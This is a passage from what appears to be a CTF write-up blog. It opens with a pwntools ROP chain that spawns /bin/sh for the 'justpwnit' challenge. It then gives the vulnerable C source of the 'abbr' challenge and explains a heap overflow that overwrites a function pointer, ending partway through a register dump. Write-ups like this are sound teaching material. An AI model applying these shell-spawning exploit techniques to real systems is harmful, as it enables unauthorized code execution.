<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>

<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>

<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="abbr">
        abbr
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#abbr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor abbr" href="#abbr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
<p>Here is the source code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&#34;rules.h&#34;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Translator</span> <span class="p">{</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">translate</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">);</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Translator</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">english_expand</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">alen</span><span class="p">,</span> <span class="n">blen</span><span class="p">;</span>
  <span class="n">Rule</span> <span class="o">*</span><span class="n">r</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">text</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// pointer to the last character
</span><span class="c1"></span>
  <span class="cm">/* Replace all abbreviations */</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="o">++</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rules</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Rule</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">r</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rules</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
      <span class="n">alen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">);</span>
      <span class="n">blen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">strncasecmp</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">,</span> <span class="n">alen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// i.e &#34;i&#39;m pwn noob.&#34; --&gt; &#34;i&#39;m pwn XXnoob.&#34;
</span><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="n">q</span> <span class="o">=</span> <span class="n">end</span><span class="p">;</span> <span class="n">q</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">;</span> <span class="o">--</span><span class="n">q</span><span class="p">)</span>
          <span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">+</span><span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
        <span class="c1">// Update end
</span><span class="c1"></span>        <span class="n">end</span> <span class="o">+=</span> <span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">end</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
        <span class="c1">// i.e &#34;i&#39;m pwn XXnoob.&#34; --&gt; &#34;i&#39;m pwn newbie.&#34;
</span><span class="c1"></span>        <span class="n">memcpy</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">,</span> <span class="n">blen</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="n">Translator</span> <span class="o">*</span><span class="nf">translator_new</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">;</span>

  <span class="cm">/* Allocate region for text */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">text</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="cm">/* Initialize translator */</span>
  <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">Translator</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Translator</span><span class="p">));</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span> <span class="o">=</span> <span class="n">english_expand</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">t</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">translator_reset</span><span class="p">(</span><span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>

  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span> <span class="o">=</span> <span class="n">translator_new</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Input data */</span>
    <span class="n">translator_reset</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter text: &#34;</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>

    <span class="cm">/* Expand abbreviation */</span>
    <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Result: %s&#34;</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The <code>rules.h</code> looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">// abbreviated string (i.e &#34;asap&#34;)
</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span> <span class="c1">// expanded string (i.e &#34;as soon as possible&#34;)
</span><span class="c1"></span><span class="p">}</span> <span class="n">Rule</span><span class="p">;</span>

<span class="c1">// Why are there so many abbreviations in English!!?? :exploding_head:
</span><span class="c1"></span><span class="n">Rule</span> <span class="n">rules</span><span class="p">[]</span> <span class="o">=</span>
  <span class="p">{</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;2f4u&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;too fast for you&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;4yeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aamof&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as a matter of fact&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afaik&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as far as i know&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;away from keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;also known as&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b2k&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to topic&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;by the way&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b/c&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;because&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;c&amp;p&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;copy and paste&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cys&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;check your settings&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;diy&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;do it yourself&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;eobd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;end of business day&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;faq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;frequently asked questions&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;formerly known as&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fwiw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for what it&#39;s worth&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your information&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jfyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;just for your information&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;have fun&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hth&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;hope this helps&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;idk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;i don&#39;t know&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iirc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;if i remember correctly&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my humble opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imnsho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my not so humble opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iow&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in other words&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;itt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in this thread&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;dgmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;don&#39;t get me wrong&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;mmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;mark my words&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nntr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no need to reply&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;newbie&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noyb&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;none of your business&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nrn&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no reply necessary&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;otoh&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;on the other hand&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rtfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;read the fine manual&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;scnr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry, could not resist&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;sflr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry for late reply&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tba&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be announced&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tbc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be continued&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tia&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thanks in advance&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyvm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you very much&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;take your time&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ttyl&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;talk to you later&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;works for me&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wtf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;what the fuck&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wrt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;with regard to&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ymmd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;you made my day&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;icymi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in case you missed it&#34;</span><span class="p">},</span>
   <span class="c1">// pwners abbreviations
</span><span class="c1"></span>   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;jump oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;call oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aar&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address read&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aaw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address write&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;www&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;write what where&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;oob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;out of bounds&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ret2&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return to &#34;</span><span class="p">},</span>
  <span class="p">};</span>
</code></pre></div><p>The main stuff is in <code>english_expand</code> function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.
The attack idea is fairly simple, the <code>text</code> variable is allocated right before the <code>Translator</code> structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by <code>text</code> and that we put an abbreviation of the right length we can overwrite the <code>translate</code> function pointer.</p>
<p>I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.
An interesting abbreviation is the <code>www</code>, which stands for &ldquo;write what where&rdquo; (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.
So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadget)</code>, we will overflow the 32 first bytes next the <code>text</code> chunk, and in this rewrite the <code>translator</code> function pointer.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="ropchain-1">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain-1" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain-1">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Once that&rsquo;s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
Lets take a look at the values of the registers when we trigger the function pointer:</p>
<pre tabindex="0"><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
 RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
 RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\n' */
 R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 R9   0x0
 R10  0x49e522 ◂— 'Enter text: '
 R11  0x246
 R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 
 R13  0x0
 R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 
 R15  0x0
 RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 
